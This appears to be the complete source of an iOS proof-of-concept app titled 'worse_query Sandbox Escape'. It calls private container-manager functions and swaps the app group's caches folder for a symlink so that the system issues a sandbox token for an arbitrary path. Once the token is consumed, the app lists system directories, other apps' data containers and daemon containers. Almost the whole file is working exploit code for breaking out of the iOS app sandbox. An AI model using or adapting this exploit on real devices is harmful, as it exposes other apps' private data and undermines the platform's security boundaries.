#import <UIKit/UIKit.h>
#import <xpc/xpc.h>
#import <dlfcn.h>
#import <sys/stat.h>

// worse_query function declarations
typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

static void clean_symlink(NSString *group) {
    if (group != NULL) {
        NSFileManager *files = [NSFileManager defaultManager];
        NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier: group];
        if (groupRoot) {
            NSURL *caches = [groupRoot URLByAppendingPathComponent: @"Library/Caches"];
            [files removeItemAtURL: caches error: nil];
            [files createDirectoryAtURL: caches withIntermediateDirectories: false attributes: nil error: nil];
        }
    }
}

int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool create_dir) {
    if (!create_dir) {
        struct stat st;
        if (lstat(target.fileSystemRepresentation, &st) != 0) return -255;
    }
    
    NSFileManager *files = [NSFileManager defaultManager];
    NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier: group];
    if (!groupRoot) return -1;
    NSString *caches = [[groupRoot URLByAppendingPathComponent: @"Library/Caches"] path];
    
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -2;
    
    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    
    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
        dlclose(mgr);
        return -2;
    }
    
    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return -3;
    }
    
    xpc_object_t identifier;
    query_set_class(query, 7);
    identifier = xpc_string_create(group.UTF8String);
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3);
    if (alt_flags) {
        query_set_flags(query, 0x0000000800000000ULL);
    } else {
        query_set_flags(query, 0x0000008000000000ULL);
    }
    
    [files removeItemAtPath: caches error: nil];
    if ([files createSymbolicLinkAtPath: caches withDestinationPath: target error: nil] == false) {
        dlclose(mgr);
        return -4;
    }
    
    void *result = query_get_single_result(query);
    if (!result) {
        query_free(query);
        dlclose(mgr);
        clean_symlink(group);
        return -5;
    }
    
    char *token = copy_sandbox_token(result);
    if (!token) {
        query_free(query);
        dlclose(mgr);
        clean_symlink(group);
        return -6;
    }
    
    int64_t handle = consume_extension(token);
    query_free(query);
    free(token);
    dlclose(mgr);
    clean_symlink(group);
    
    return handle;
}

void worse_query_release(int64_t handle) {
    if (handle < 0) return;
    sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@property (strong, nonatomic) UITextView *logView;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    
    UIViewController *vc = [[UIViewController alloc] init];
    self.logView = [[UITextView alloc] initWithFrame:self.window.bounds];
    self.logView.editable = NO;
    self.logView.text = @"worse_query Sandbox Escape\n\n";
    vc.view = self.logView;
    
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        [self escape];
    });
    
    return YES;
}

- (void)log:(NSString *)msg {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.logView.text = [self.logView.text stringByAppendingString:[msg stringByAppendingString:@"\n"]];
    });
}

- (void)escape {
    [self log:@"[1] Starting worse_query sandbox escape...\n"];
    
    NSString *appGroup = @"group.com.jasonquiles.F1OOB";
    
    // Test 1: Access /var/containers/Data/System
    [self log:@"[2] Testing /var/containers/Data/System..."];
    int64_t handle1 = worse_query(@"/var/containers/Data/System", appGroup, false, false);
    if (handle1 >= 0) {
        [self log:@"  *** SUCCESS! Access to /var/containers/Data/System ***"];
        
        // Try to read files
        NSFileManager *fm = [NSFileManager defaultManager];
        NSArray *contents = [fm contentsOfDirectoryAtPath:@"/var/containers/Data/System" error:nil];
        if (contents) {
            for (NSString *item in contents) {
                NSString *msg = [NSString stringWithFormat:@"    %@", item];
                [self log:msg];
            }
        }
        worse_query_release(handle1);
    } else {
        NSString *msg = [NSString stringWithFormat:@"  Failed: %lld", handle1];
        [self log:msg];
    }
    
    usleep(100000);
    
    // Test 2: Access other app containers
    [self log:@"\n[3] Testing /var/mobile/Containers/Data/Application..."];
    int64_t handle2 = worse_query(@"/var/mobile/Containers/Data/Application", appGroup, false, false);
    if (handle2 >= 0) {
        [self log:@"  *** SUCCESS! Access to other app containers ***"];
        
        NSFileManager *fm = [NSFileManager defaultManager];
        NSArray *contents = [fm contentsOfDirectoryAtPath:@"/var/mobile/Containers/Data/Application" error:nil];
        if (contents) {
            for (NSString *item in contents) {
                NSString *msg = [NSString stringWithFormat:@"    App: %@", item];
                [self log:msg];
            }
        }
        worse_query_release(handle2);
    } else {
        NSString *msg = [NSString stringWithFormat:@"  Failed: %lld", handle2];
        [self log:msg];
    }
    
    usleep(100000);
    
    // Test 3: Access InternalDaemon containers
    [self log:@"\n[4] Testing /var/mobile/Containers/Data/InternalDaemon..."];
    int64_t handle3 = worse_query(@"/var/mobile/Containers/Data/InternalDaemon", appGroup, false, false);
    if (handle3 >= 0) {
        [self log:@"  *** SUCCESS! Access to InternalDaemon containers ***"];
        
        NSFileManager *fm = [NSFileManager defaultManager];
        NSArray *contents = [fm contentsOfDirectoryAtPath:@"/var/mobile/Containers/Data/InternalDaemon" error:nil];
        if (contents) {
            for (NSString *item in contents) {
                NSString *msg = [NSString stringWithFormat:@"    Daemon: %@", item];
                [self log:msg];
            }
        }
        worse_query_release(handle3);
    } else {
        NSString *msg = [NSString stringWithFormat:@"  Failed: %lld", handle3];
        [self log:msg];
    }
    
    [self log:@"\n[5] Done"];
}

@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
